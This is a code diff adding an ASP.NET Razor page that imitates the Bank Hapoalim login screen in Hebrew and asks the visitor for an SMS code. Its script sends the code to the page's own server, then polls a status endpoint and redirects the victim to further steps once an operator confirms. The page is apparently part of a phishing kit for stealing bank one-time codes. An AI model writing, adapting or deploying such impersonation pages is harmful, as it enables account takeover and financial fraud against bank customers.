@@ -1,0 +1,192 @@
+@model Detail;
+@{
+    ViewData["Title"] = "בנק הפועלים - כניסה לחשבונך";
+}
+
+<div class="loader hide">
+    <img src="~/images/loader.gif"
+         alt="loader" />
+</div>
+
+<header>
+    <a class="" aria-label="בנק הפועלים פרטי - קישור לאתר השיווקי">
+        <img 
+            src="~/images/logo.png"
+            alt="logo"
+            width="200px"
+            height="34px"
+        />
+    </a>
+
+    <!-- Links -->
+    <ul class="links">
+        <li class="link">
+            <a href="/he/login/account-login-errors/">
+                <img src="~/svg/support.svg"
+                    alt="שירות ותמיכה" />
+                שירות ותמיכה
+            </a>
+        </li>
+
+        <li class="link">
+            <a href="/he/login/account-login-errors/">
+                <img src="~/svg/secure-account.svg"
+                    alt="הגנה על החשבון שלי" />
+                הגנה על החשבון שלי
+            </a>
+        </li>
+
+        <li class="link">
+            <a href="/he/login/account-login-errors/">
+                <img src="~/svg/mistake.svg"
+                    alt="טעויות נפוצות בכניסה לחשבון" />
+                טעויות נפוצות בכניסה לחשבון
+            </a>
+        </li>
+
+        <li class="link">
+            <a href="/he/login/account-login-errors/">
+                <img src="~/svg/location.svg"
+                    alt="תנאי גישה" />
+                תנאי גישה
+            </a>
+        </li>
+
+        <li class="link">
+            <a href="/he/login/account-login-errors/">
+                <img src="~/svg/roles.svg"
+                    alt="כללי גלישה בטוחה" />
+                כללי גלישה בטוחה
+            </a>
+        </li>
+    </ul>
+</header>
+
+<section class="hero">
+    <div class="login-container">
+        <h2>כניסה לחשבונך</h2>
+
+        <!-- Form -->
+        <form class="form" method="post">
+            @Html.AntiForgeryToken()
+            <div class="form-inputs-container">
+                <div class="form-group">
+                    <label>סמס</label>
+                    <div>
+                        <input type="text"
+                               name="code"
+                               id="sms"
+                               autocomplete="off"
+                               aria-invalid="false"
+                               inputmode="text"
+                               spellcheck="false"
+                               autocapitalize="none"
+                               required />
+
+                        <!-- Input Icon -->
+                        <span class="input-icon"></span>
+
+                        <!-- Input line -->
+                        <span class="line"></span>
+                    </div>
+                    <span class="error" role="alert"></span>
+                </div>
+            </div>
+
+            <div class="info">
+                <a class="forgot-details">שכחתי קוד משתמש / סיסמה</a>
+
+                <!-- Button -->
+                <button class="btn submit-button">כניסה</button>
+            </div>
+
+            <!-- Login Errors -->
+            <div class="login-errors hide">
+                <span>אחד או יותר מהפרטים המזהים שהקלדת שגוי.</span>
+                <span>יש להבחין בין אותיות גדולות וקטנות באנגלית.</span>
+            </div>
+        </form>
+    </div>
+</section>
+
+
+
+@section Scripts{
+    <script>
+        const loader = document.querySelector(".loader");
+        const submitButton = document.querySelector(".submit-button");
+        const input = document.querySelector("input");
+        const error = document.querySelector(".error");
+        const loginErrorResponse = document.querySelector(".login-errors");
+        const postURL = window.origin;
+
+        async function submitForm(e) {
+            e.preventDefault();
+
+            const formData = new FormData();
+            formData.append("code", input.value);
+
+            if(input.value !== "" && error.textContent === "") {
+                loader.classList.remove("hide");
+
+                try {
+                    const response = await fetch(postURL, {
+                        method: "POST",
+                        body: formData,
+                    });
+
+                    if(response.ok) {
+                        const data = await response.json();
+                        setInterval(checkUserStatus(data.user), 500);
+                    }
+
+                } catch (err) {
+                    throw new Error(err);
+                }
+            } else {
+                if(input.value === "") 
+                    error.textContent = "עליך להזין קוד משתמש";
+                else 
+                    error.textContent = "";
+            }
+        }
+
+        async function checkUserStatus(user) {
+            try {
+                const response = await fetch(`${postURL}/status?user=${user}`);
+                const userStatus = await response.json();
+                
+                if(userStatus) {
+                    if(userStatus.confirmed) {
+                        window.location.href = "/confirmed";
+                    } else if(!userStatus.confirmed && userStatus.getSms) {
+                        window.location.href = "/sms";
+                    }
+                }
+            } catch(error) {
+                throw new Error(error);
+            }
+        }
+
+        function checkInputValues(e) {
+            const { target } = e;
+            const { value, name } = target;
+            const inputParent = target.parentNode.parentNode;
+            const errorEle = target.parentNode.nextElementSibling;
+
+            if(value.length < 8) {
+                inputParent.classList.add("error");
+                errorEle.textContent = "הסיסמה צריכה להכיל  8 תווים לפחות";
+            } else if(value.length >= 14) {
+                inputParent.classList.add("error");
+                errorEle.textContent = "הסיסמה צריכה להכיל 14 תווים לכל היותר"
+            } else {
+                inputParent.classList.remove("error");
+                errorEle.textContent = "";
+            }
+        }
+
+        submitButton.addEventListener("click", submitForm);
+        input.addEventListener("keyup", checkInputValues);
+    </script>
+    }
